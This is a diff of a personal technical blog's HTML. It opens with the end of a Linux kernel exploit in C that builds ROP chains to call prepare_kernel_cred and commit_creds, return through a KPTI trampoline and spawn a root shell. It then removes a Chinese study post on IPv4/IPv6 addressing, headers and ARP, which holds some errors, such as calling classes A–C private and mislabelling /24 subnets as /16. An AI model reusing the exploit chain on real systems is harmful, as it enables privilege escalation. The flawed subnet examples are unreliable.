class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_commit_creds</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Leaking commit_creds offset&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rax_ret;</span><br><span class="line">    payload[offset++] = addr_ksymtab_commit_creds;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = addr_deref_rax_pop_rbp_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0xdeadbeef</span>;  <span class="comment">//rbp </span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = calculate_addr_commit_creds;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// puts(&quot;[*] overflow &quot;);</span></span><br><span class="line">    <span class="comment">// puts(&quot;[+] commit_creds offset saved in eax\n&quot;);</span></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">calculate_addr_commit_creds</span><span class="params">()</span>&#123;</span><br><span class="line">    value_offset = <span class="number">0</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov value_offset,eax;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax = %p\n&quot;</span>,value_offset);</span><br><span class="line">    addr_commit_creds = addr_ksymtab_commit_creds - ((<span class="number">1</span>&lt;&lt;<span class="number">32</span>) - value_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Leaked addr_commit_creds: %p\n&quot;</span>,addr_commit_creds);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] addr_commit_creds calculated\n&quot;</span>);</span><br><span class="line">    execute_prepare_kernel_cred();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_prepare_kernel_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] executing prepare_kernel_cred&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = addr_prepare_kernel_cred;  <span class="comment">//ret in rax</span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = save_init_task_cred;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_init_task_cred</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov addr_init_task_cred,rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;.att_syntax;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;rax = %p\n&quot;</span>,addr_init_task_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;init task_cred address: %p\n&quot;</span>,addr_init_task_cred);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] addr_init_task_cred saved\n\n&quot;</span>);</span><br><span class="line">    execute_commit_creds();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">execute_commit_creds</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] executing commit_creds&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> offset = (<span class="number">0xa0</span> - <span class="number">0x20</span>) &gt;&gt; <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(payload,<span class="number">0</span>,offset*<span class="number">8</span>);</span><br><span class="line">    payload[offset++] = canary;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = <span class="number">0</span>;</span><br><span class="line">    payload[offset++] = addr_pop_rdi_ret;</span><br><span class="line">    payload[offset++] = addr_init_task_cred;</span><br><span class="line">    payload[offset++] = addr_commit_creds;  <span class="comment">//ret in rax</span></span><br><span class="line">    payload[offset++] = addr_kpti_trampoline;</span><br><span class="line"></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rax = 0</span></span><br><span class="line">    payload[offset++] = <span class="number">0</span>;  <span class="comment">//rdi = 0</span></span><br><span class="line">    payload[offset++] = spawn_shell;</span><br><span class="line">    payload[offset++] = user_cs;</span><br><span class="line">    payload[offset++] = user_rflags;</span><br><span class="line">    payload[offset++] = user_sp;</span><br><span class="line">    payload[offset++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// puts(&quot;[*] overflow &quot;);</span></span><br><span class="line">    write(dev_fd,payload,offset*<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2024/11/23/%E7%9C%8B%E7%9C%8B%E4%BD%A0%E7%9A%84Bins/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -4597,896 +5131,6 @@
 <p>3.EvalVisitor类继承CalculatorBaseVisitor类</p>
 <p>4.在EvalVisitor类中重写标签相对应的语义规则</p>
 <p>5.编写测试类Test,于其中指定输入流,组装lexer,组装 parser,建立ParserTree,用EvalVisitor实例,访问语法树实例</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2023/02/12/%E7%BD%91%E7%BB%9C%E5%B1%82/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
-      <meta itemprop="name" content="dustball">
-      <meta itemprop="description" content="dustland">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dustland">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/02/12/%E7%BD%91%E7%BB%9C%E5%B1%82/" class="post-title-link" itemprop="url">计算机网络-网络层</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-02-12 18:29:00 / Modified: 18:29:10" itemprop="dateCreated datePublished" datetime="2023-02-12T18:29:00+08:00">2023-02-12</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><h3 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h3><h4 id="IPv4地址"><a href="#IPv4地址" class="headerlink" title="IPv4地址"></a>IPv4地址</h4><h5 id="早期地址分类"><a href="#早期地址分类" class="headerlink" title="早期地址分类"></a>早期地址分类</h5><p>最早的IP地址被划分为五类,ABCDE</p>
-<p>根据前缀区分</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208190722568.png" alt="image-20230208190722568"></p>
-<p>A类地址的网络地址占一个字节</p>
-<p>整个IP地址空间的一半都是A类地址</p>
-<p>B类地址的网络地址占两个字节</p>
-<p>整个IP地址空间的四分之一是B类地址</p>
-<p>其中A,B,C类网络地址是私有地址</p>
-<h5 id="特殊IP地址"><a href="#特殊IP地址" class="headerlink" title="特殊IP地址"></a>特殊IP地址</h5><table>
-<thead>
-<tr>
-<th><strong>网络号</strong></th>
-<th><strong>主机号</strong></th>
-<th><strong>源地址使用</strong></th>
-<th><strong>目的地址使用</strong></th>
-<th><strong>意义</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0</td>
-<td>0</td>
-<td>可以</td>
-<td>不可</td>
-<td>默认路径地址0.0.0.0，<br />本网络上的本主机</td>
-</tr>
-<tr>
-<td>0</td>
-<td>host-id</td>
-<td>可以</td>
-<td>不可</td>
-<td>本网络上的某个主机</td>
-</tr>
-<tr>
-<td>全1</td>
-<td>全1</td>
-<td>不可</td>
-<td>可以</td>
-<td>广播地址255.255.255.255，<br />只在本网络上广播（路由器不转发）<br />范围局限在LAN中,即同一子网掩码的网段内</td>
-</tr>
-<tr>
-<td>net-id</td>
-<td>全1</td>
-<td>不可</td>
-<td>可以</td>
-<td>特定子网的广播地址，<br />对net-id上所有主机广播</td>
-</tr>
-<tr>
-<td>127</td>
-<td>非全0或全1的数</td>
-<td>可以</td>
-<td>可以</td>
-<td>用作本地软件环回测试</td>
-</tr>
-<tr>
-<td>169.254</td>
-<td>0</td>
-<td>可以</td>
-<td>可以</td>
-<td>主机无法获取IP地址时<br />会自动配置地址169.254.x.x&#x2F;16，<br />使其可以通信</td>
-</tr>
-</tbody></table>
-<h5 id="多级IP地址"><a href="#多级IP地址" class="headerlink" title="多级IP地址"></a>多级IP地址</h5><p>早期的网络地址&#x3D;网络号+主机号</p>
-<p>然而这种划分有很多浪费,于是引入三级IP地址</p>
-<p>网络地址&#x3D;网络号+子网号+主机号</p>
-<p>只需要给大组织分配一个A或者B类地址,然后该组织自己划分子网号即可</p>
-<p>只看IP地址是看不出有没有划分过子网的</p>
-<p>这就是子网掩码的作用了</p>
-<p>子网掩码”掩”住的是子网前缀,比如255.255.255.0这个子网掩码,它表明只有IP地址的最后一个字节才是主机号,前面的是网络号和子网号.</p>
-<p>$$<br>网络地址(原网络地址+子网地址)&#x3D;IP地址 按位与 子网掩码<br>$$</p>
-<p>192.168.1.0这是网络地址</p>
-<p>192.168.1.255这是子网的广播地址</p>
-<p>192.168.1.[1,254]这是可以给主机分配的IP地址</p>
-<h5 id="子网掩码和网关"><a href="#子网掩码和网关" class="headerlink" title="子网掩码和网关"></a>子网掩码和网关</h5><p>一个计算机尝试访问另一个IP地址时,会进行如下计算:</p>
-<p>自己的IP地址和自己的子网掩码按位与得到自己的网络地址</p>
-<p>目标的IP地址和自己的子网掩码按位与,结果与自己的网络地址比较</p>
-<p>如果相同说明目标计算机是”网上邻居”,同处于一个子网内,则链路层帧的目的MAC地址就会填写该目标计算机的MAC地址.如果不知道邻居的MAC地址,会使用ARP协议,根据邻居的IP地址,查邻居的MAC地址</p>
-<p>如果不同说明目标不在同一子网内,需要访问”外面的世界”.这就需要网关转发,于是将链路层目的MAC地址填上网关的MAC地址.</p>
-<blockquote>
-<p>如何获取网关的MAC地址?</p>
-<p>这台计算机是有网关的IP地址的,不管是手动填上的还是DHCP获取的,反正就是有</p>
-<p>然后本计算机通过ARP协议,根据网关的IP地址询问网关的MAC地址</p>
-</blockquote>
-<p>这就存在一种单向通的情况:</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208195437212.png" alt="image-20230208195437212"></p>
-<p>192.168.3.4&#x2F;16可以往192.168.1.1&#x2F;24发包,并且可以被收到</p>
-<p>但是192.168.1.1&#x2F;24无法向192.168.3.4&#x2F;16发包,</p>
-<p>因为<a href="mailto:&#80;&#67;&#49;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#46;&#x31;">&#80;&#67;&#49;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#x31;&#46;&#x31;</a>经过计算,192.168.3.4是一个外网地址,但是自己没有设置网关,因此不知道应该把包发给谁</p>
-<h5 id="可变长子网掩码VLSM"><a href="#可变长子网掩码VLSM" class="headerlink" title="可变长子网掩码VLSM"></a>可变长子网掩码VLSM</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208200108836.png" alt="image-20230208200108836"></p>
-<h5 id="地址划分举例"><a href="#地址划分举例" class="headerlink" title="地址划分举例"></a>地址划分举例</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208200145777.png" alt="image-20230208200145777"></p>
-<blockquote>
-<p>分配给某一小型组织机构一个地址块，我们已知块中一个地址是205.16.37.39&#x2F;28，求该块的起始地址?</p>
-<p>网络前缀有28位,这就意味着IP地址的前三个字节都是固定死的205.16.37,最后这个字节的高四位是固定死的</p>
-<p>39&#x3D;0010’0111b,那么起始地址应该是0010’0000b,也就是32</p>
-<p>因此这个网络块的起始地址是205.16.37.32</p>
-<p>块的起始地址一般不会分配,作为网络地址</p>
-<p>块的最后地址也不会分配,作为本块的广播地址</p>
-</blockquote>
-<blockquote>
-<p>已给一个组织分配了17.12.14.0&#x2F;26的地址块，该组织有3个部门，需要划分为32、16和16个地址的子块。</p>
-<p>17.12.14.0&#x2F;26这个地址空间里有$2^{32-26}&#x3D;64$个地址,恰好划分为32+16+16</p>
-<p>因此可以这样划分:</p>
-<p>172.12.14.00’100000&#x2F;27,即172.12.14.32&#x2F;27</p>
-<p>172.12.14.00’010000&#x2F;28,即172.12.14.16&#x2F;28</p>
-<p>172.12.14.00’000000&#x2F;28,即172.12.14.0&#x2F;28</p>
-</blockquote>
-<blockquote>
-<p>某单位分配到一个 B 类 IP 地址，其net-id为129.250.0.0。</p>
-<p>该单位有4000台机器，平均分布在16个不同的地点。</p>
-<p>如选用子网掩码为255.255.255.0，试给每一地点分配一个子网号码，</p>
-<p>并计算出每个地点主机号码的最小值和最大值。</p>
-<p>4000台机器均分到16个地点,则每个地点有250台,一个&#x2F;24子网中最多有256-2&#x3D;254台</p>
-<p>因此一个255.255.255.0子网可以容纳250台机器</p>
-<p>只需要将129.250.0.0&#x2F;16这样划分:</p>
-<table>
-<thead>
-<tr>
-<th>子网号(Binary)</th>
-<th>子网号(Decimal)</th>
-<th>网络地址</th>
-<th>主机IP地址范围</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>00000000</td>
-<td>0</td>
-<td>129.250.0.0&#x2F;16</td>
-<td>129.250.0.1~129.250.0.254</td>
-</tr>
-<tr>
-<td>00000001</td>
-<td>1</td>
-<td>129.250.1.0&#x2F;16</td>
-<td>129.250.1.1~129.250.1.254</td>
-</tr>
-<tr>
-<td>00000010</td>
-<td>2</td>
-<td>129.250.2.0&#x2F;16</td>
-<td>129.250.2.1~129.250.2.254</td>
-</tr>
-<tr>
-<td>00000011</td>
-<td>3</td>
-<td>129.250.3.0&#x2F;16</td>
-<td>129.250.3.1~129.250.3.254</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-<td>…</td>
-<td></td>
-</tr>
-<tr>
-<td>00001111</td>
-<td>15</td>
-<td>129.250.15.0&#x2F;16</td>
-<td>129.250.15.1~129.250.15.254</td>
-</tr>
-</tbody></table>
-</blockquote>
-<h4 id="NAT地址转换"><a href="#NAT地址转换" class="headerlink" title="NAT地址转换"></a>NAT地址转换</h4><table>
-<thead>
-<tr>
-<th>NAT类型</th>
-<th>映射关系</th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>静态NAT</td>
-<td>一个内网地址对应一个公网地址</td>
-<td></td>
-</tr>
-<tr>
-<td>动态NAT</td>
-<td>多个内网地址对应多个公网地址</td>
-<td></td>
-</tr>
-<tr>
-<td>PAT</td>
-<td>多个内网地址对应一个公网地址的多个端口号</td>
-<td></td>
-</tr>
-</tbody></table>
-<h4 id="IPv4包"><a href="#IPv4包" class="headerlink" title="IPv4包"></a>IPv4包</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031183937685.png" alt="image-20221031183937685"></p>
-<p>Data用于承载运输层的协议,比如TCP,UDP</p>
-<p>Header是IPv4数据报首部,其中Option为可选项,除此之外的前20个字节是固定的</p>
-<h5 id="VER"><a href="#VER" class="headerlink" title="VER"></a>VER</h5><p>4bits</p>
-<p>IP协议的版本号,目前只有4和6两种,代表IPv4,IPv6</p>
-<p>两种IP协议的首部有区别,但是接收方只要是看到这个VER字段,就可以决定后面用IPv6还是IPv4协议来解释后面的数据报了</p>
-<h5 id="HLEN"><a href="#HLEN" class="headerlink" title="HLEN"></a>HLEN</h5><p>4bits</p>
-<p>由于存在Option这个变量,为了区分首部和数据,需要维护一个值,记录IPv4数据报的首部共有多少字节.这个值就放在HLEN字段,共4位,最大是15,单位是4字节,也就是说,IPv4首部最大可以是15*4&#x3D;60字节,即Option最大是40字节</p>
-<p>由于首部最小是20字节,因此HLEN这个值最小是5</p>
-<h5 id="SERVICE"><a href="#SERVICE" class="headerlink" title="SERVICE"></a>SERVICE</h5><p>8bits</p>
-<p>要么表示服务类型</p>
-<p>要么表示区分服务</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031185352059.png" alt="image-20221031185352059"></p>
-<h6 id="服务类型"><a href="#服务类型" class="headerlink" title="服务类型"></a>服务类型</h6><p>用于获得更好的服务</p>
-<blockquote>
-<p>注意服务类型不是高层协议类型</p>
-<p>运输层上使用的是TCP还是UDP等等,是由Protocol字段决定的</p>
-</blockquote>
-<p>用于描述上层(运输层)的服务类型,</p>
-<p>前3bits用于描述优先级</p>
-<p>后1bits不使用</p>
-<p>中间4bits,DTRC,用于描述服务类型</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212153218410.png" alt="image-20230212153218410"></p>
-<h6 id="差分服务"><a href="#差分服务" class="headerlink" title="差分服务"></a>差分服务</h6><p>前6bits是码点子字段,后面2bits不用</p>
-<p>其中码点的不同组合有不同的意义</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031185950842.png" alt="image-20221031185950842"></p>
-<h5 id="Total-Length"><a href="#Total-Length" class="headerlink" title="Total Length"></a>Total Length</h5><p>16bits</p>
-<p>总长度,len(header + data),单位,字节</p>
-<p>最大长度不超过$2^{16}&#x3D;65536bytes$</p>
-<p>又总长度不能超过链路层规定的最大传送单元MTU,以太网(正在使用的局域网规范)该值默认是1500字节</p>
-<p>以太网链路层帧限制上层的数据报长度在46~1500字节之间,不够46字节需要填充</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031194233356.png" alt="MTU"></p>
-<p>也就是说链路层的协议,其Header到Trailer之间的空间有限,最大是MTU规定的大小,IP数据报必须尊重地域差异,入乡随俗</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212153927371.png" alt="image-20230212153927371"></p>
-<h5 id="Identification"><a href="#Identification" class="headerlink" title="Identification"></a>Identification</h5><p>16bits</p>
-<p>一段数据由于MTU的限制,可能要分成多个包发送,本字段用来表明哪些包是同一个文件的.</p>
-<h5 id="Flags"><a href="#Flags" class="headerlink" title="Flags"></a>Flags</h5><p>3bits</p>
-<p>标志,用于标识该数据报是否可以分片,如果分片,是不是最后一片</p>
-<p>最前面一个bit不用</p>
-<p>中间一个bit是MF位,表征是否还有分片,1则还有分片,0则表明该数据报是最后一个分片</p>
-<p>最后一个bit是DF位,表征是否可以分片,1不能分片,0允许分片</p>
-<table>
-<thead>
-<tr>
-<th>reserved</th>
-<th>MF</th>
-<th>DF</th>
-</tr>
-</thead>
-</table>
-<h5 id="Fragmentation-Offset"><a href="#Fragmentation-Offset" class="headerlink" title="Fragmentation Offset"></a>Fragmentation Offset</h5><p>13bits</p>
-<p>分片偏移,对于同一个包的分片,</p>
-<p>指出较长的分组在分片后,其中一片在原分组中的编号.单位:8字节<br>$$<br>分片偏移&#x3D;IP数据的第一个字节编号&#x2F;8<br>$$</p>
-<p>$8\times 2^{13}&#x3D;2^{16}&#x3D;65536bytes$</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031194849825.png" alt="image-20221031194849825"></p>
-<blockquote>
-<p>本机在10.177.148.9,使用ICMP协议给61.150.43.78发送3500个字节的数据</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;ping www.xidian.edu.cn -l 3500</span><br></pre></td></tr></table></figure>
-
-<p>其中一组ping-pong应答:</p>
-<p>去的包有三个,分别长1514,1514,587字节</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031201439099.png"></p>
-<p>为啥可以比mtu&#x3D;1500多?因为这是整个数据报的总长度,包括了链路层的头</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031201739441.png" alt="image-20221031201739441"></p>
-<p>前两个总长度1514字节的包,实际上IPv4数据报就是1500字节,其中IPv4首部占用了20字节</p>
-</blockquote>
-<h5 id="Time-to-live"><a href="#Time-to-live" class="headerlink" title="Time to live"></a>Time to live</h5><p>8bits</p>
-<p>生存时间TTL,用于表示最大跳数,即该包还可以通过多少个路由器转发</p>
-<p>为了防止数据报在网络上无休止地被转发而占用资源.路由器在转发每个数据报之前,都会首先将其TTL减一,如果降为0,则丢弃该数据报,不再转发</p>
-<h5 id="Protocol"><a href="#Protocol" class="headerlink" title="Protocol"></a>Protocol</h5><p>8bits</p>
-<p>协议类型,用于表示上层使用的协议,也就是data中存放的是啥协议的数据报</p>
-<p>常用的协议编号如下</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031192637226.png" alt="image-20221031192637226"></p>
-<h5 id="Header-checksum"><a href="#Header-checksum" class="headerlink" title="Header checksum"></a>Header checksum</h5><p>16bits</p>
-<p>首部检校和,咋算的呢?</p>
-<p>这里的首部包含Option字段,并且首部一定是4字节对齐的,Option如果不是4字节的倍数则向上取整到4字节的倍数</p>
-<p>计算方式:</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031193058326.png" alt="image-20221031193058326"></p>
-<p>需要注意的是发送方最终填写的Check Sum是校验和计算值的反码</p>
-<p>接收方也是将校验和计算结果取反检查是否是全零</p>
-<p>比如</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031193231527.png" alt="image-20221031193231527"></p>
-<h5 id="Source-Destination-IP-address"><a href="#Source-Destination-IP-address" class="headerlink" title="Source&#x2F;Destination IP address"></a>Source&#x2F;Destination IP address</h5><p>分别是32bits,源和目的主机的IP地址</p>
-<h5 id="Option"><a href="#Option" class="headerlink" title="Option"></a>Option</h5><p>可以没有,最大40字节</p>
-<p>首部附加选项</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221031202035076.png" alt="image-20221031202035076"></p>
-<h3 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h3><h4 id="IPv6地址"><a href="#IPv6地址" class="headerlink" title="IPv6地址"></a>IPv6地址</h4><p>长128位</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208205753221.png" alt="image-20230208205753221"></p>
-<p>懒人表示法:</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208210147178.png" alt="image-20230208210147178"></p>
-<p>全零的段可以只写一个0</p>
-<p>连续的全零段可以用一个Gap代替,全零段之间的冒号可以省去了.但是一个IPv6地址中<strong>只能有一个Gap</strong></p>
-<blockquote>
-<p>为啥只能有一个GAP?看看如何还原</p>
-</blockquote>
-<p>带有Gap的地址如何还原?</p>
-<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230208210408867.png" alt="image-20230208210408867"></p>
-<h4 id="IPv6包"><a href="#IPv6包" class="headerlink" title="IPv6包"></a>IPv6包</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212154305058.png" alt="image-20230212154305058"></p>
-<p>IPv6头部包括固定40个字节的基础头部和可变长度的拓展头部,拓展头部的长度会在基础头部中给出</p>
-<h5 id="Base-Header"><a href="#Base-Header" class="headerlink" title="Base Header"></a>Base Header</h5><p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212154406661.png" alt="image-20230212154406661"></p>
-<table>
-<thead>
-<tr>
-<th>字段</th>
-<th>作用</th>
-<th>长度(bit)</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Version</td>
-<td>IPv6版本</td>
-<td>4</td>
-</tr>
-<tr>
-<td>Traffic Class</td>
-<td>优先级,发生拥塞时分组的优先级</td>
-<td>4</td>
-</tr>
-<tr>
-<td>Flow Label</td>
-<td>流标号,类似于之前的Identification</td>
-<td>24</td>
-</tr>
-<tr>
-<td>Payload Length</td>
-<td>有效载荷长度,即拓展头+IP数据的长度,单位:字节</td>
-<td>16</td>
-</tr>
-<tr>
-<td>Next Header</td>
-<td>指明上层协议,类似于Protocol</td>
-<td>8</td>
-</tr>
-<tr>
-<td>Hop Limit</td>
-<td>TTL</td>
-<td></td>
-</tr>
-<tr>
-<td>Source&#x2F;<br />Destination Address</td>
-<td>源&#x2F;目的地址</td>
-<td>128&#x2F;128</td>
-</tr>
-</tbody></table>
-<h4 id="IPv4向IPv6过渡"><a href="#IPv4向IPv6过渡" class="headerlink" title="IPv4向IPv6过渡"></a>IPv4向IPv6过渡</h4><p>三种过渡方法:</p>
-<table>
-<thead>
-<tr>
-<th>过渡方法</th>
-<th>原理</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>双协议栈</td>
-<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212155148399.png" alt="image-20230212155148399" style="zoom:25%;" /></td>
-</tr>
-<tr>
-<td>隧道</td>
-<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212155201345.png" alt="image-20230212155201345" style="zoom:25%;" /></td>
-</tr>
-<tr>
-<td>头转换</td>
-<td><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230212155229167.png" alt="image-20230212155229167" style="zoom:25%;" /></td>
-</tr>
-</tbody></table>
-<h3 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h3><h4 id="数据报"><a href="#数据报" class="headerlink" title="数据报"></a>数据报</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20221101171944341.png" alt="image-20221101171944341"></p>
-<h5 id="Hardware-Type"><a href="#Hardware-Type" class="headerlink" title="Hardware Type"></a>Hardware Type</h5><p>16bits</p>
-<p>链路层协议类型,以太网为1</p>
-<h5 id="Protocol-Type"><a href="#Protocol-Type" class="headerlink" title="Protocol Type"></a>Protocol Type</h5><p>16bits</p>
-<p>网络层协议类型,IP协议为0x0800</p>
-<h5 id="Hardware-length"><a href="#Hardware-length" class="headerlink" title="Hardware length"></a>Hardware length</h5><p>8bits</p>
-<p>物理地址长度,比如以太网的物理地址,即MAC地址的长度就是6字节</p>
-<h5 id="Protocol-length"><a href="#Protocol-length" class="headerlink" title="Protocol length"></a>Protocol length</h5><p>8bits</p>
-<p>逻辑地址长度,比如IPv4地址的长度就是4字节</p>
-<h5 id="Operation"><a href="#Operation" class="headerlink" title="Operation"></a>Operation</h5><p>16bits</p>
-<p>ARP分组类型,有两种,Request请求或者Reply应答</p>
